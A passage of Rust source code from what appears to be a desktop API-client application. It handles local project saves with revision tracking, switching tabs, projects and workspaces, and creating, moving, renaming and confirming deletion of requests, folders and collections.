            Ok(committed_rev) => {
                let updated_rev = {
                    let entry = self
                        .project_persisted_revs
                        .entry(project_id.to_owned())
                        .or_insert(0);
                    *entry = (*entry).max(*committed_rev);
                    *entry
                };
                let current_edit_rev = self.current_edit_rev(project_id);
                if updated_rev >= current_edit_rev {
                    self.save_errors.remove(project_id);
                }
                self.sync_dirty();
                self.current().id == project_id && updated_rev >= current_edit_rev && !self.dirty
            }
            Err(err_msg) => {
                if !has_newer_in_flight {
                    self.save_errors
                        .insert(project_id.to_owned(), err_msg.clone());
                }
                self.sync_dirty();
                false
            }
        }
    }

    pub(super) fn apply_editor(&mut self, cx: &mut Context<Self>) -> Result<()> {
        if let Some(id) = self.selected_id.as_deref() {
            let draft = self.read_request_draft(cx)?;
            if let Some(request) = self.projects[self.active_project].find_request_mut(id) {
                draft.apply_to(request);
            }
        }
        self.editor_dirty = false;
        self.sync_dirty();
        Ok(())
    }

    /// Apply the active draft, surfacing an invalid draft in the status bar and a toast.
    fn apply_editor_or_report(
        &mut self,
        error_prefix: &str,
        window: &mut Window,
        cx: &mut Context<Self>,
    ) -> bool {
        if let Err(error) = self.apply_editor(cx) {
            let msg = format!("{error_prefix}: {error:#}");
            self.set_status(msg.clone(), true, cx);
            window.push_notification(Notification::error(msg), cx);
            return false;
        }
        true
    }

    fn enqueue_project_save(
        &mut self,
        success_status: Option<SharedString>,
        success_toast: Option<SharedString>,
        error_prefix: &'static str,
        window: Option<&mut Window>,
        cx: &mut Context<Self>,
    ) -> bool {
        if self.editor_dirty
            && let Err(err) = self.apply_editor(cx)
        {
            let msg = format!("{error_prefix}: {err:#}");
            self.set_status(msg.clone(), true, cx);
            Self::push_window_notification(window, Notification::error(msg), cx);
            return false;
        }
        let project_id = self.current().id.clone();
        let revision = self.current_edit_rev(&project_id);
        let persisted = self.current_persisted_rev(&project_id);
        let has_error = self.save_errors.contains_key(&project_id);
        if revision <= persisted && !has_error && !self.in_flight_saves.contains_key(&project_id) {
            self.sync_dirty();
            if let Some(status) = success_status {
                self.set_status(status, false, cx);
            }
            if let Some(toast) = success_toast {
                Self::push_window_notification(window, Notification::success(toast), cx);
            }
            return true;
        }
        let snapshot = self.current().clone();
        let store = self.store.clone();
        self.record_in_flight_save(&project_id, revision);
        self.set_status("Saving locally…", false, cx);
        let rx = self.persistence.submit_save(store, snapshot, revision);
        self.spawn_io_callback(rx, cx, move |view, outcome, window, cx| {
            let clean_current = view.finish_save_tracking(&project_id, revision, &outcome);
            let has_newer = view
                .in_flight_saves
                .get(&project_id)
                .is_some_and(|&r| r > revision);
            match outcome {
                Ok(_) => {
                    if clean_current {
                        if let Some(status) = success_status {
                            view.set_status(status, false, cx);
                        }
                        if let Some(toast) = success_toast {
                            Self::push_window_notification(
                                window,
                                Notification::success(toast),
                                cx,
                            );
                        }
                    } else {
                        cx.notify();
                    }
                }
                Err(err_msg) => {
                    if !has_newer {
                        let msg = format!("{error_prefix}: {err_msg}");
                        view.set_status(msg.clone(), true, cx);
                        Self::push_window_notification(window, Notification::error(msg), cx);
                    } else {
                        cx.notify();
                    }
                }
            }
        });
        true
    }

    fn flush_current_project_then<F>(
        &mut self,
        error_prefix: &'static str,
        window: Option<&mut Window>,
        cx: &mut Context<Self>,
        on_flushed: F,
    ) where
        F: FnOnce(&mut Self, Option<&mut Window>, &mut Context<Self>) + 'static,
    {
        let project_id = self.current().id.clone();
        let needs_flush = self.dirty
            || self.editor_dirty
            || self.current_edit_rev(&project_id) > self.current_persisted_rev(&project_id)
            || self.in_flight_saves.contains_key(&project_id)
            || self.save_errors.contains_key(&project_id);
        if !needs_flush {
            on_flushed(self, window, cx);
            return;
        }
        if self.editor_dirty
            && let Err(err) = self.apply_editor(cx)
        {
            let msg = format!("{error_prefix}: {err:#}");
            self.set_status(msg.clone(), true, cx);
            Self::push_window_notification(window, Notification::error(msg), cx);
            return;
        }
        self.transition_generation = self.transition_generation.wrapping_add(1);
        let expected_gen = self.transition_generation;
        let revision = self.current_edit_rev(&project_id);
        let snapshot = self.current().clone();
        let store = self.store.clone();
        self.record_in_flight_save(&project_id, revision);
        self.set_status("Saving locally…", false, cx);
        let rx = self.persistence.submit_save(store, snapshot, revision);
        self.spawn_io_callback(rx, cx, move |view, outcome, window, cx| {
            let clean_current = view.finish_save_tracking(&project_id, revision, &outcome);
            match outcome {
                Ok(_) => {
                    if view.transition_generation == expected_gen && clean_current {
                        on_flushed(view, window, cx);
                    } else {
                        cx.notify();
                    }
                }
                Err(err_msg) => {
                    let msg = format!("{error_prefix}: {err_msg}");
                    view.set_status(msg.clone(), true, cx);
                    Self::push_window_notification(window, Notification::error(msg), cx);
                }
            }
        });
    }

    fn save(&mut self, window: Option<&mut Window>, cx: &mut Context<Self>) -> bool {
        self.enqueue_project_save(
            Some("Saved locally".into()),
            None,
            "Save failed",
            window,
            cx,
        )
    }

    fn prune_responses_to_current_project(&mut self) {
        let current = &self.projects[self.active_project];
        self.responses
            .retain(|id| current.find_request(id).is_some());
    }

    pub(super) fn save_with_toast(&mut self, window: &mut Window, cx: &mut Context<Self>) {
        self.enqueue_project_save(
            Some("Saved locally".into()),
            Some("Request saved locally".into()),
            "Save failed",
            Some(window),
            cx,
        );
    }

    pub(super) fn toggle_rename_request(&mut self, window: &mut Window, cx: &mut Context<Self>) {
        if self.editing_request_name {
            if self.enqueue_project_save(
                Some("Saved locally".into()),
                None,
                "Cannot rename",
                Some(window),
                cx,
            ) {
                self.editing_request_name = false;
            }
        } else {
            self.editing_request_name = true;
            self.request_name
                .read(cx)
                .focus_handle(cx)
                .focus(window, cx);
        }
        cx.notify();
    }

    pub(super) fn open_request(&mut self, id: String, window: &mut Window, cx: &mut Context<Self>) {
        if self.chain_mode && self.chain_blocks_navigation(window, cx) {
            return;
        }
        if self.selected_id.as_ref() == Some(&id) {
            self.chain_mode = false;
            cx.notify();
            return;
        }
        self.flush_current_project_then(
            "Cannot switch tab",
            Some(window),
            cx,
            move |view, window, cx| {
                view.cancel(cx);
                view.chain_mode = false;
                view.activate_request_tab(Some(id), window, cx);
            },
        );
    }

    /// Select a request, ensure it has a tab, and load its draft into the editor.
    fn activate_request_tab(
        &mut self,
        id: Option<String>,
        window: Option<&mut Window>,
        cx: &mut Context<Self>,
    ) {
        self.selected_id = id;
        if let Some(id) = &self.selected_id
            && !self.open_tabs.contains(id)
        {
            self.open_tabs.push(id.clone());
        }
        if let Some(window) = window {
            self.load_editor(window, cx);
        } else {
            cx.notify();
        }
    }

    pub(super) fn close_tab(&mut self, id: &str, window: &mut Window, cx: &mut Context<Self>) {
        let id_owned = id.to_owned();
        if self.selected_id.as_deref() == Some(id) {
            self.flush_current_project_then(
                "Cannot close tab",
                Some(window),
                cx,
                move |view, window, cx| {
                    view.cancel(cx);
                    view.open_tabs.retain(|tab| tab != &id_owned);
                    if view.selected_id.as_deref() == Some(id_owned.as_str()) {
                        let next = view.open_tabs.last().cloned();
                        view.activate_request_tab(next, window, cx);
                    }
                    cx.notify();
                },
            );
        } else {
            self.open_tabs.retain(|tab| tab != id);
            cx.notify();
        }
    }

    fn restore_project_selector(&mut self, window: &mut Window, cx: &mut Context<Self>) {
        let active = self.active_project;
        self.project_selector.update(cx, |selector, cx| {
            selector.set_selected_index(Some(IndexPath::default().row(active)), window, cx);
        });
    }

    pub(super) fn switch_project(
        &mut self,
        index: usize,
        window: &mut Window,
        cx: &mut Context<Self>,
    ) {
        if index == self.active_project || index >= self.projects.len() {
            return;
        }
        if self.chain_blocks_navigation(window, cx) {
            self.restore_project_selector(window, cx);
            return;
        }
        self.flush_current_project_then(
            "Cannot switch project",
            Some(window),
            cx,
            move |view, mut window, cx| {
                if index >= view.projects.len() || index == view.active_project {
                    return;
                }
                if let Some(window) = window.as_deref_mut()
                    && view.chain_blocks_navigation(window, cx)
                {
                    view.restore_project_selector(window, cx);
                    return;
                }
                view.chain_editor = None;
                view.cancel(cx);
                view.active_project = index;
                if let Some(window) = window {
                    if view
                        .project_selector
                        .read(cx)
                        .selected_index(cx)
                        .map(|p| p.row)
                        != Some(index)
                    {
                        view.project_selector.update(cx, |sel, cx| {
                            sel.set_selected_index(
                                Some(IndexPath::default().row(index)),
                                window,
                                cx,
                            );
                        });
                    }
                    view.selected_id = view.current().first_request_id();
                    view.open_tabs = view.selected_id.clone().into_iter().collect();
                    view.target_folder = None;
                    view.prune_responses_to_current_project();
                    view.refresh_resolved_variables();
                    view.refresh_request_count();
                    view.expand_initial();
                    view.load_editor(window, cx);
                    view.set_status(format!("Project: {}", view.current().name), false, cx);
                }
            },
        );
    }

    pub(super) fn focus_folder_from_palette(
        &mut self,
        id: String,
        ancestor_ids: Vec<String>,
        cx: &mut Context<Self>,
    ) {
        for ancestor in ancestor_ids {
            self.expanded.insert(ancestor);
        }
        self.expanded.insert(id.clone());
        self.bump_explorer_epoch();
        self.target_folder = Some(id.clone());
        self.scroll_explorer_to_id(&id);
        cx.notify();
    }

    pub(super) fn switch_workspace(
        &mut self,
        index: usize,
        window: &mut Window,
        cx: &mut Context<Self>,
    ) {
        if index == self.active_workspace || index >= self.workspaces.len() {
            return;
        }
        if self.chain_blocks_navigation(window, cx) {
            return;
        }
        self.flush_current_project_then(
            "Cannot switch workspace",
            Some(window),
            cx,
            move |view, _window, cx| {
                if index >= view.workspaces.len() || index == view.active_workspace {
                    return;
                }
                view.transition_generation = view.transition_generation.wrapping_add(1);
                let expected_gen = view.transition_generation;
                let ws_store = view.workspace_store.clone();
                let ws_id = view.workspaces[index].id.clone();
                let ws_name = view.workspaces[index].name.clone();
                view.set_status(format!("Loading workspace '{ws_name}'…"), false, cx);
                let rx = view.persistence.submit_io(move || {
                    let store = ws_store.for_workspace(&ws_id)?;
                    let (mut projects, warnings) = store.list_resilient()?;
                    if projects.is_empty() {
                        projects.push(store.create("Project 1")?);
                    }
                    Ok::<_, anyhow::Error>((store, projects, warnings))
                });
                view.spawn_io_callback(rx, cx, move |view, result, mut window, cx| {
                    if view.transition_generation != expected_gen {
                        return;
                    }
                    match result {
                        Ok((store, projects, warnings)) => {
                            if let Some(window) = window.as_deref_mut()
                                && view.chain_blocks_navigation(window, cx)
                            {
                                view.set_status("Workspace switch cancelled", false, cx);
                                return;
                            }
                            view.chain_editor = None;
                            view.cancel(cx);
                            view.responses.clear();
                            view.store = store;
                            view.projects = projects;
                            view.active_workspace = index;
                            view.active_project = 0;
                            view.target_folder = None;
                            view.selected_id = view.current().first_request_id();
                            view.open_tabs = view.selected_id.clone().into_iter().collect();
                            if let Some(window) = window.as_deref_mut() {
                                let choices = project_choices(&view.projects);
                                view.project_selector.update(cx, |selector, cx| {
                                    selector.set_items(choices, window, cx);
                                    selector.set_selected_index(
                                        Some(IndexPath::default()),
                                        window,
                                        cx,
                                    );
                                });
                                view.refresh_resolved_variables();
                                view.refresh_request_count();
                                view.expand_initial();
                                view.load_editor(window, cx);
                            } else {
                                view.refresh_resolved_variables();
                            }
                            if warnings.is_empty() {
                                view.set_status(format!("Workspace: {ws_name}"), false, cx);
                            } else {
                                let msg = warnings.join("; ");
                                view.set_status(format!("Loaded with warnings: {msg}"), true, cx);
                                Self::push_window_notification(
                                    window,
                                    Notification::warning(msg),
                                    cx,
                                );
                            }
                        }
                        Err(error) => {
                            let msg = format!("Cannot switch workspace: {error:#}");
                            view.set_status(msg.clone(), true, cx);
                            Self::push_window_notification(window, Notification::error(msg), cx);
                        }
                    }
                });
            },
        );
    }

    pub(super) fn add_folder(&mut self, cx: &mut Context<Self>) {
        let parent = self.target_folder.clone();
        self.insert_folder_at(parent.as_deref(), cx);
    }

    pub(super) fn add_subfolder(&mut self, parent_id: &str, cx: &mut Context<Self>) {
        self.insert_folder_at(Some(parent_id), cx);
    }

    fn insert_folder_at(&mut self, parent_id: Option<&str>, cx: &mut Context<Self>) {
        let folder = Folder::new("New Folder");
        let id = folder.id.clone();
        let container_id = self.projects[self.active_project].insert_folder(parent_id, folder);
        self.expanded.insert(container_id);
        self.expanded.insert(id.clone());
        self.target_folder = Some(id);
        let project_id = self.current().id.clone();
        self.bump_project_revision(&project_id);
        self.sync_dirty();
        self.save(None, cx);
    }

    pub(super) fn add_request(&mut self, window: &mut Window, cx: &mut Context<Self>) {
        let request = ApiRequest::new("GET", "New Request", "");
        self.insert_and_open_request_with_notice(request, "Saved locally".into(), None, window, cx);
    }

    pub(super) fn insert_and_open_request_with_notice(
        &mut self,
        request: ApiRequest,
        success_status: SharedString,
        success_toast: Option<SharedString>,
        window: &mut Window,
        cx: &mut Context<Self>,
    ) {
        if self.editor_dirty
            && !self.apply_editor_or_report("Cannot save active request", window, cx)
        {
            return;
        }
        let id = request.id.clone();
        let container_id = self.projects[self.active_project]
            .insert_request(self.target_folder.as_deref(), request);
        self.expanded.insert(container_id);
        self.refresh_request_count();
        let project_id = self.current().id.clone();
        self.bump_project_revision(&project_id);
        self.cancel(cx);
        self.activate_request_tab(Some(id), Some(window), cx);
        self.enqueue_project_save(
            Some(success_status),
            success_toast,
            "Create request failed",
            Some(window),
            cx,
        );
    }

    pub(super) fn duplicate_request(
        &mut self,
        id: &str,
        window: &mut Window,
        cx: &mut Context<Self>,
    ) {
        if self.editor_dirty && !self.apply_editor_or_report("Save failed", window, cx) {
            return;
        }
        if let Some(new_id) = self.projects[self.active_project].duplicate_request(id) {
            self.refresh_request_count();
            let project_id = self.current().id.clone();
            self.bump_project_revision(&project_id);
            self.cancel(cx);
            self.activate_request_tab(Some(new_id), Some(window), cx);
            self.enqueue_project_save(
                Some("Request duplicated".into()),
                Some("Request duplicated".into()),
                "Save failed",
                Some(window),
                cx,
            );
        }
    }

    fn apply_editor_for_tree_move(&mut self, window: &mut Window, cx: &mut Context<Self>) -> bool {
        self.apply_editor_or_report("Cannot apply editor changes", window, cx)
    }

    fn persist_tree_change(
        &mut self,
        status: impl Into<SharedString>,
        window: &mut Window,
        cx: &mut Context<Self>,
    ) {
        let project_id = self.current().id.clone();
        self.bump_project_revision(&project_id);
        self.sync_dirty();
        self.enqueue_project_save(Some(status.into()), None, "Save failed", Some(window), cx);
    }

    pub(super) fn move_request_offset(
        &mut self,
        request_id: &str,
        delta: isize,
        window: &mut Window,
        cx: &mut Context<Self>,
    ) {
        if !self.apply_editor_for_tree_move(window, cx) {
            return;
        }
        if self.projects[self.active_project].move_request_offset(request_id, delta) {
            self.persist_tree_change("Request order updated", window, cx);
        }
    }

    pub(super) fn move_request_to_folder(
        &mut self,
        request_id: &str,
        target_folder_id: Option<&str>,
        window: &mut Window,
        cx: &mut Context<Self>,
    ) {
        if !self.apply_editor_for_tree_move(window, cx) {
            return;
        }
        if self.projects[self.active_project].move_request_to_folder(request_id, target_folder_id) {
            if let Some(folder_id) = target_folder_id {
                self.expanded.insert(folder_id.to_owned());
            }
            let status = match target_folder_id
                .and_then(|id| self.current().find_folder(id))
                .map(|f| f.name.as_str())
            {
                Some(name) => format!("Moved request to '{name}'"),
                None => "Moved request to root".into(),
            };
            self.persist_tree_change(status, window, cx);
        }
    }

    pub(super) fn move_request_to_collection(
        &mut self,
        request_id: &str,
        collection_id: &str,
        window: &mut Window,
        cx: &mut Context<Self>,
    ) {
        if !self.apply_editor_for_tree_move(window, cx) {
            return;
        }
        if self.projects[self.active_project].move_request_to_collection(request_id, collection_id)
        {
            self.expanded.insert(collection_id.to_owned());
            self.persist_tree_change("Moved request to root", window, cx);
        }
    }

    pub(super) fn move_request_relative(
        &mut self,
        request_id: &str,
        target_request_id: &str,
        after: bool,
        window: &mut Window,
        cx: &mut Context<Self>,
    ) {
        if !self.apply_editor_for_tree_move(window, cx) {
            return;
        }
        if self.projects[self.active_project].move_request_relative(
            request_id,
            target_request_id,
            after,
        ) {
            if let Some(folder_id) = self.current().request_parent_folder(target_request_id) {
                self.expanded.insert(folder_id);
            }
            self.persist_tree_change("Request moved", window, cx);
        }
    }

    pub(super) fn move_folder_offset(
        &mut self,
        folder_id: &str,
        delta: isize,
        window: &mut Window,
        cx: &mut Context<Self>,
    ) {
        if !self.apply_editor_for_tree_move(window, cx) {
            return;
        }
        if self.projects[self.active_project].move_folder_offset(folder_id, delta) {
            self.persist_tree_change("Folder order updated", window, cx);
        }
    }

    pub(super) fn move_folder_to_folder(
        &mut self,
        folder_id: &str,
        target_folder_id: Option<&str>,
        window: &mut Window,
        cx: &mut Context<Self>,
    ) {
        if !self.apply_editor_for_tree_move(window, cx) {
            return;
        }
        if self.projects[self.active_project].move_folder_to_folder(folder_id, target_folder_id) {
            if let Some(target_id) = target_folder_id {
                self.expanded.insert(target_id.to_owned());
            }
            let status = match target_folder_id
                .and_then(|id| self.current().find_folder(id))
                .map(|f| f.name.as_str())
            {
                Some(name) => format!("Moved folder to '{name}'"),
                None => "Moved folder to root".into(),
            };
            self.persist_tree_change(status, window, cx);
        }
    }

    pub(super) fn move_folder_to_collection(
        &mut self,
        folder_id: &str,
        collection_id: &str,
        window: &mut Window,
        cx: &mut Context<Self>,
    ) {
        if !self.apply_editor_for_tree_move(window, cx) {
            return;
        }
        if self.projects[self.active_project].move_folder_to_collection(folder_id, collection_id) {
            self.expanded.insert(collection_id.to_owned());
            self.persist_tree_change("Moved folder to root", window, cx);
        }
    }

    pub(super) fn move_collection_offset(
        &mut self,
        collection_id: &str,
        delta: isize,
        window: &mut Window,
        cx: &mut Context<Self>,
    ) {
        if !self.apply_editor_for_tree_move(window, cx) {
            return;
        }
        if self.projects[self.active_project].move_collection_offset(collection_id, delta) {
            self.persist_tree_change("Collection order updated", window, cx);
        }
    }

    pub(super) fn move_folder_relative(
        &mut self,
        folder_id: &str,
        target_folder_id: &str,
        after: bool,
        window: &mut Window,
        cx: &mut Context<Self>,
    ) {
        if !self.apply_editor_for_tree_move(window, cx) {
            return;
        }
        if self.projects[self.active_project].move_folder_relative(
            folder_id,
            target_folder_id,
            after,
        ) {
            if let Some(parent_id) = self.current().folder_parent_folder(target_folder_id) {
                self.expanded.insert(parent_id);
            }
            self.persist_tree_change("Folder moved", window, cx);
        }
    }

    fn finalize_rename(
        &mut self,
        status: SharedString,
        window: &mut Window,
        cx: &mut Context<Self>,
    ) {
        let project_id = self.current().id.clone();
        self.bump_project_revision(&project_id);
        self.sync_dirty();
        self.enqueue_project_save(
            Some(status.clone()),
            Some(status),
            "Rename failed",
            Some(window),
            cx,
        );
    }

    pub(super) fn open_name_dialog(
        &mut self,
        kind: NameDialogKind,
        window: &mut Window,
        cx: &mut Context<Self>,
    ) {
        let (title, placeholder, initial, ok_text) = match &kind {
            NameDialogKind::NewWorkspace => (
                "Create Workspace",
                "Workspace name",
                String::new(),
                "Create",
            ),
            NameDialogKind::NewProject => {
                ("Create Project", "Project name", String::new(), "Create")
            }
            NameDialogKind::RenameFolder(folder_id) => {
                let current_name = self
                    .current()
                    .find_folder(folder_id)
                    .map(|f| f.name.clone())
                    .unwrap_or_default();
                ("Rename Folder", "Folder name", current_name, "Rename")
            }
            NameDialogKind::RenameCollection(collection_id) => {
                let current_name = self
                    .current()
                    .find_collection(collection_id)
                    .map(|c| c.name.clone())
                    .unwrap_or_default();
                (
                    "Rename Collection",
                    "Collection name",
                    current_name,
                    "Rename",
                )
            }
        };

        let input = cx.new(|cx| {
            InputState::new(window, cx)
                .placeholder(placeholder)
                .default_value(initial)
        });
        let initial_focus = Cell::new(true);
        let weak_view = cx.weak_entity();
        let kind_ok = kind.clone();

        window.open_dialog(cx, move |dialog, window, cx| {
            if initial_focus.replace(false) {
                input.read(cx).focus_handle(cx).focus(window, cx);
            }
            let input_ok = input.clone();
            let weak_ok = weak_view.clone();
            let kind_exec = kind_ok.clone();
            dialog
                .w(px(400.))
                .title(title)
                .button_props(
                    DialogButtonProps::default()
                        .ok_text(ok_text)
                        .show_cancel(true),
                )
                .on_ok(move |_, window, cx| {
                    let value = input_ok.read(cx).value().trim().to_string();
                    if value.is_empty() {
                        window.push_notification(Notification::warning("Name cannot be empty"), cx);
                        return false;
                    }
                    let _ = weak_ok.update(cx, |view, cx| match &kind_exec {
                        NameDialogKind::NewWorkspace => {
                            let ws_store = view.workspace_store.clone();
                            let name_for_io = value.clone();
                            let name_for_ui = value.clone();
                            view.set_status(
                                format!("Creating workspace '{name_for_ui}'…"),
                                false,
                                cx,
                            );
                            let rx = view.persistence.submit_io(move || {
                                ws_store
                                    .create_workspace(&name_for_io)
                                    .map_err(|err| format!("{err:#}"))
                            });
                            view.spawn_io_callback(rx, cx, move |view, outcome, mut window, cx| {
                                match outcome {
                                    Ok(ws) => {
                                        view.workspaces.push(ws);
                                        let idx = view.workspaces.len() - 1;
                                        if let Some(window) = window.as_deref_mut() {
                                            view.switch_workspace(idx, window, cx);
                                        }
                                        Self::push_window_notification(
                                            window,
                                            Notification::success(format!(
                                                "Workspace '{name_for_ui}' created"
                                            )),
                                            cx,
                                        );
                                    }
                                    Err(err) => {
                                        let msg = format!("Workspace failed: {err}");
                                        view.set_status(msg.clone(), true, cx);
                                        Self::push_window_notification(
                                            window,
                                            Notification::error(msg),
                                            cx,
                                        );
                                    }
                                }
                            });
                        }
                        NameDialogKind::NewProject => {
                            let name = value.clone();
                            view.flush_current_project_then(
                                "Save failed",
                                Some(window),
                                cx,
                                move |view, _, cx| {
                                    view.transition_generation =
                                        view.transition_generation.wrapping_add(1);
                                    let expected_gen = view.transition_generation;
                                    let store = view.store.clone();
                                    let expected_root = store.root().to_path_buf();
                                    let name_for_io = name.clone();
                                    view.set_status(
                                        format!("Creating project '{name}'…"),
                                        false,
                                        cx,
                                    );
                                    let rx = view.persistence.submit_io(move || {
                                        store.create(&name_for_io).map_err(|err| format!("{err:#}"))
                                    });
                                    view.spawn_io_callback(
                                        rx,
                                        cx,
                                        move |view, outcome, mut window, cx| match outcome {
                                            Ok(project) => {
                                                if view.transition_generation == expected_gen
                                                    && view.store.root() == expected_root.as_path()
                                                {
                                                    if let Some(window) = window.as_deref_mut() {
                                                        view.push_and_select_project(
                                                            project, window, cx,
                                                        );
                                                    }
                                                    Self::push_window_notification(
                                                        window,
                                                        Notification::success(format!(
                                                            "Project '{name}' created"
                                                        )),
                                                        cx,
                                                    );
                                                }
                                            }
                                            Err(err) => {
                                                let msg = format!("Project failed: {err}");
                                                view.set_status(msg.clone(), true, cx);
                                                Self::push_window_notification(
                                                    window,
                                                    Notification::error(msg),
                                                    cx,
                                                );
                                            }
                                        },
                                    );
                                },
                            );
                        }
                        NameDialogKind::RenameFolder(folder_id) => {
                            if view.projects[view.active_project]
                                .rename_folder(folder_id, value.clone())
                            {
                                view.finalize_rename("Folder renamed".into(), window, cx);
                            }
                        }
                        NameDialogKind::RenameCollection(collection_id) => {
                            if view.projects[view.active_project]
                                .rename_collection(collection_id, value.clone())
                            {
                                view.finalize_rename("Collection renamed".into(), window, cx);
                            }
                        }
                    });
                    true
                })
                .child(Input::new(&input).small())
        });
    }

    /// Shared shell for destructive confirmations (danger button, cancel, warning text).
    fn confirm_destructive_dialog<F>(
        &self,
        spec: DestructiveDialogSpec,
        on_confirm: F,
        window: &mut Window,
        cx: &mut Context<Self>,
    ) where
        F: Fn(&mut Self, &mut Window, &mut Context<Self>) + 'static,
    {
        let DestructiveDialogSpec {
            title,
            ok_text,
            message,
            width,
        } = spec;
        let weak_view = cx.weak_entity();
        let on_confirm = Rc::new(on_confirm);
        window.open_dialog(cx, move |dialog, _, _| {
            let weak_ok = weak_view.clone();
            let confirm = Rc::clone(&on_confirm);
            let message = message.clone();
            dialog
                .w(width)
                .title(title)
                .button_props(
                    DialogButtonProps::default()
                        .ok_text(ok_text)
                        .ok_variant(ButtonVariant::Danger)
                        .show_cancel(true),
                )
                .on_ok(move |_, window, cx| {
                    let _ = weak_ok.update(cx, |view, cx| confirm(view, window, cx));
                    true
                })
                .child(div().text_size(px(13.)).child(message))
        });
    }

    pub(super) fn confirm_delete_request(
        &mut self,
        id: String,
        window: &mut Window,
        cx: &mut Context<Self>,
    ) {
        let name = self
            .current()
            .find_request(&id)
            .map(|r| r.name.clone())
            .unwrap_or_else(|| "this request".into());
        self.confirm_destructive_dialog(
            DestructiveDialogSpec {
                title: "Delete Request",
                ok_text: "Delete",
                message: format!("Delete \"{name}\" from this project? This cannot be undone."),
                width: px(400.),
            },
            move |view, window, cx| view.delete_request_now(&id, window, cx),
            window,
            cx,
        );
    }

    fn delete_request_now(&mut self, id: &str, window: &mut Window, cx: &mut Context<Self>) {
        if self.chain_blocks_delete(|request_id| request_id == id, window, cx) {
            return;
        }
        if self.selected_id.as_deref() == Some(id) {
            self.cancel(cx);
        } else if self.editor_dirty
            && !self.apply_editor_or_report("Cannot save active request", window, cx)
        {
            return;
        }
        if self.projects[self.active_project].delete_request(id) {
            self.responses.remove(id);
            self.open_tabs.retain(|tab| tab != id);
            self.refresh_request_count();
            let project_id = self.current().id.clone();
            self.bump_project_revision(&project_id);
            self.sync_dirty();
            if self.selected_id.as_deref() == Some(id) {
                let next = self
                    .open_tabs
                    .last()
                    .cloned()
                    .or_else(|| self.current().first_request_id());
                self.activate_request_tab(next, Some(window), cx);
            }
            self.enqueue_project_save(
                Some("Request deleted".into()),
                Some("Request deleted".into()),
                "Save failed",
                Some(window),
                cx,
            );
        }
    }

    pub(super) fn confirm_delete_folder(
        &mut self,
        id: String,
        window: &mut Window,
        cx: &mut Context<Self>,
    ) {
        let name = self
            .current()
            .find_folder(&id)
            .map(|f| f.name.clone())
            .unwrap_or_else(|| "this folder".into());
        self.confirm_destructive_dialog(
            DestructiveDialogSpec {
                title: "Delete Folder",
                ok_text: "Delete Folder",
                message: format!(
                    "Delete folder \"{name}\" and all requests inside it? This cannot be undone."
                ),
                width: px(420.),
            },
            move |view, window, cx| view.delete_folder_now(&id, window, cx),
            window,
            cx,
        );
    }

    fn reconcile_after_container_delete(
        &mut self,
        status: &'static str,
        window: &mut Window,
        cx: &mut Context<Self>,
    ) {
        self.refresh_request_count();
        if self
            .target_folder
            .as_deref()
            .is_some_and(|tf| self.current().find_folder(tf).is_none())
        {
            self.target_folder = None;
        }
        self.prune_responses_to_current_project();
        let selected_removed = {
            let current = &self.projects[self.active_project];
            self.open_tabs
                .retain(|tab| current.find_request(tab).is_some());
            self.selected_id
                .as_deref()
                .is_some_and(|sel| current.find_request(sel).is_none())
        };
        if selected_removed {
            self.cancel(cx);
            let next = self
                .open_tabs
                .last()
                .cloned()
                .or_else(|| self.current().first_request_id());
            self.activate_request_tab(next, Some(window), cx);
        } else if self.editor_dirty {
            let _ = self.apply_editor(cx);
        }
        let project_id = self.current().id.clone();
        self.bump_project_revision(&project_id);
        self.sync_dirty();
        self.enqueue_project_save(
            Some(status.into()),
            Some(status.into()),
            "Save failed",
            Some(window),
            cx,
        );
    }

    fn delete_folder_now(&mut self, id: &str, window: &mut Window, cx: &mut Context<Self>) {
        if let Some(folder) = self.current().find_folder(id)
            && self.chain_blocks_delete(
                |request_id| folder.find_request(request_id).is_some(),
                window,
                cx,
            )
        {
            return;
        }
        if self.projects[self.active_project].delete_folder(id) {
            self.reconcile_after_container_delete("Folder deleted", window, cx);
        }
    }

    pub(super) fn confirm_delete_collection(
        &mut self,
        id: String,
        window: &mut Window,
        cx: &mut Context<Self>,
    ) {
        let name = self
            .current()
            .find_collection(&id)
            .map(|c| c.name.clone())
            .unwrap_or_else(|| "this collection".into());
        self.confirm_destructive_dialog(
            DestructiveDialogSpec {
                title: "Delete Collection",
                ok_text: "Delete Collection",
                message: format!(
                    "Delete collection \"{name}\" and all folders/requests inside it? This cannot be undone."
                ),
                width: px(420.),
            },
            move |view, window, cx| view.delete_collection_now(&id, window, cx),
            window,
            cx,
        );
    }

    fn delete_collection_now(&mut self, id: &str, window: &mut Window, cx: &mut Context<Self>) {
        if let Some(collection) = self.current().find_collection(id)
            && self.chain_blocks_delete(
                |request_id| collection.find_request(request_id).is_some(),
                window,
                cx,
            )
        {
            return;
        }
        if self.projects[self.active_project].delete_collection(id) {
            self.reconcile_after_container_delete("Collection deleted", window, cx);
        }
    }

    fn chain_blocks_delete(
        &self,
        removes_request: impl Fn(&str) -> bool,
        window: &mut Window,
        cx: &mut App,
    ) -> bool {
        let Some(chain) = self.current().chains.iter().find(|chain| {
            chain
                .steps
                .iter()
                .any(|step| removes_request(&step.request_id))
        }) else {
            return false;
        };
        window.push_notification(
            Notification::error(format!(
                "Remove the referenced step from chain “{}” first.",
                chain.name
            )),
            cx,
        );
        true
    }

    pub(super) fn open_variables_sheet(&mut self, window: &mut Window, cx: &mut Context<Self>) {
        crate::variables_sheet::open_variables_sheet(self, window, cx);
    }

    fn chain_blocks_navigation(&self, window: &mut Window, cx: &mut Context<Self>) -> bool {
        let Some(editor) = &self.chain_editor else {
            return false;
        };
        let editor = editor.read(cx);
        let message = if editor.is_running() {
            "Finish or cancel the chain run before switching."
        } else if editor.has_changes(cx) {
            "Save or discard the chain draft before switching."
        } else {
            return false;
        };
        window.push_notification(Notification::warning(message), cx);
        true
    }

    pub(super) fn open_chain_editor(
        &mut self,
        id: Option<&str>,
        window: &mut Window,
        cx: &mut Context<Self>,
    ) {
        if self.chain_blocks_navigation(window, cx) {
            return;
        }
        self.chain_editor = crate::chain_sheet::open(self, id, window, cx);
        self.chain_mode = true;
        cx.notify();
    }

    pub(super) fn close_chain_editor(&mut self, cx: &mut Context<Self>) {
        self.chain_editor = None;
        cx.notify();
    }

    fn render_chain_workspace(&self, cx: &mut Context<Self>) -> AnyElement {
        let toolbar = div()
            .flex()
            .items_center()
            .gap_3()
            .px_6()
            .py_2()
            .border_b_1()
            .border_color(cx.theme().border)
            .child(
                div()
                    .w(px(220.))
                    .child(Select::new(&self.project_selector).small()),
            )
            .child(crate::chain_sheet::chain_picker(self, cx));
        let editor = self
            .chain_editor
            .as_ref()
